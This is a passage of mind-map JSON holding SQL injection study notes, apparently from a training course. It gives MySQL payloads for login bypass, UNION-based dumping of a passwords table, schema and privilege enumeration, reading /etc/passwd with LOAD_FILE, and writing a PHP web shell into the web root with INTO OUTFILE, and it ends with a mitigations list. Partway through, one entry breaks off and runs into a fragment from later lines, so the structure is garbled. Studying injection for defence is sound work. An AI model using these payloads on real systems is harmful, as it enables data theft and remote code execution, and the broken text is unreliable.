iginal query to control execution.","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>admin&apos;)-- -<\/code> &#x2014; auth bypass closing a parenthesis then commenting out","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<code>-- -<\/code> / <code>#<\/code> &#x2014; MySQL inline comment terminators (note trailing space after <code>-- <\/code>)","children":[],"payload":{"tag":"li","lines":"20,21"}}],"payload":{"tag":"li","lines":"18,21"}}],"payload":{"tag":"h3","lines":"16,17"}},{"content":"Union-based Injection","children":[{"content":"Append a UNION SELECT to exfiltrate data from other tables; column count and types must match.","children":[],"payload":{"tag":"li","lines":"22,23"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&apos; order by 1-- -<\/code> &#x2014; detect number of columns via ORDER BY (increment until error)","children":[],"payload":{"tag":"li","lines":"24,25"}},{"content":"<code>cn&apos; UNION select 1,2,3-- -<\/code> &#x2014; detect column count via UNION","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<code>cn&apos; UNION select 1,@@version,3,4-- -<\/code> &#x2014; basic UNION injection into a visible column","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<code>UNION select username, 2, 3, 4 from passwords-- -<\/code> &#x2014; dump data via 4-column UNION","children":[],"payload":{"tag":"li","lines":"27,28"}}],"payload":{"tag":"li","lines":"23,28"}}],"payload":{"tag":"h3","lines":"21,22"}},{"content":"Database Enumeration","children":[{"content":"Fingerprint the DBMS then walk INFORMATION_SCHEMA to map databases, tables, columns, and dump data.","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>SELECT @@version<\/code> &#x2014; fingerprint MySQL with query output","children":[],"payload":{"tag":"li","lines":"31,32"}},{ os;@&apos;localhost&apos;&quot;-- -<\/code> &#x2014; list all user privileges","children":[],"payload":{"tag":"li","lines":"43,44"}},{"content":"<code>cn&apos; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -<\/code> &#x2014; check dirs reachable via MySQL","children":[],"payload":{"tag":"li","lines":"44,45"}}],"payload":{"tag":"li","lines":"40,45"}}],"payload":{"tag":"h3","lines":"38,39"}},{"content":"Reading Files via SQLi","children":[{"content":"With FILE privilege, read local files through the injection.","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>cn&apos; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -<\/code> &#x2014; read a local file","children":[],"payload":{"tag":"li","lines":"48,49"}}],"payload":{"tag":"li","lines":"47,49"}}],"payload":{"tag":"h3","lines":"45,46"}},{"content":"Writing Files / Web Shell","children":[{"content":"With FILE privilege and a writable web root (secure_file_priv empty), write files to get RCE.","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>select &apos;file written successfully!&apos; into outfile &apos;/var/www/html/proof.txt&apos;<\/code> &#x2014; write a string to a local file","children":[],"payload":{"tag":"li","lines":"52,53"}},{"content":"<code>cn&apos; union select &quot;&quot;,&apos;&lt;?php system(&#x24;_REQUEST[0]); ?&gt;&apos;, &quot;&quot;, &quot;&quot; into outfile &apos;/var/www/html/shell.php&apos;-- -<\/code> &#x2014; write a PHP web shell to the web root","children":[],"payload":{"tag":"li","lines":"53,55"}}],"payload":{"tag":"li","lines":"51,55"}}],"payload":{"tag":"h3","lines":"49,50"}}],"payload":{"tag":"h2","lines":"5,6"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"MySQL / <code>mysql<\/code> CLI &#x2014; <code>mysql -u root -h &lt;host&gt; -P 3306 -p<\/code> to connect and run SQL","children":[],"payload":{"tag":"li","lines":"56,57"}},{"content":"INFORMATION_SCHEMA &#x2014; metadata database (SCHEMATA, TABLES, COLUMNS) used for enumeration","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"Operator precedence &#x2014; <code>/ * %<\/code> &gt; <code>+ -<\/code> &gt; comparisons &gt; NOT &gt; AND &gt; OR (affects payload crafting)","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"<code>LOAD_FILE()<\/code> / <code>INTO OUTFILE<\/code> &#x2014; file read/write primitives","children":[],"payload":{"tag":"li","lines":"59,60"}},{"content":"<code>secure_file_priv<\/code> &#x2014; MySQL setting controlling file read/write locations","children":[],"payload":{"tag":"li","lines":"60,61"}},{"content":"PayloadsAllTheThings &#x2014; reference list of auth-bypass payloads","children":[],"payload":{"tag":"li","lines":"61,63"}}],"payload":{"tag":"h2","lines":"55,56"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Input sanitization &#x2014; escape/remove special characters from user input","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"Input validation &#x2014; whitelist expected input format","children":[],"payload":{"tag":"li","lines":"65,66"}},{"content":"Parameterized (prepared) queries &#x2014; separate code from data","children":[],"payload":{"tag":"li","lines":"66,67"}},{"content":"Least privilege &#x2014; restrict DB user rights (no FILE/admin privileges)","children":[],"payload":{"tag":"li","lines":"67,68"}},{"content":"Web Application Firewall (WAF) &#x2014; filter malicious requests","children":[],"payload":{"tag":"li","lines":"68,69"}}],"payload":{"tag":"h2","lines":"63,64"}}],"payload":{"tag":"h1","lines":"0,1"}}
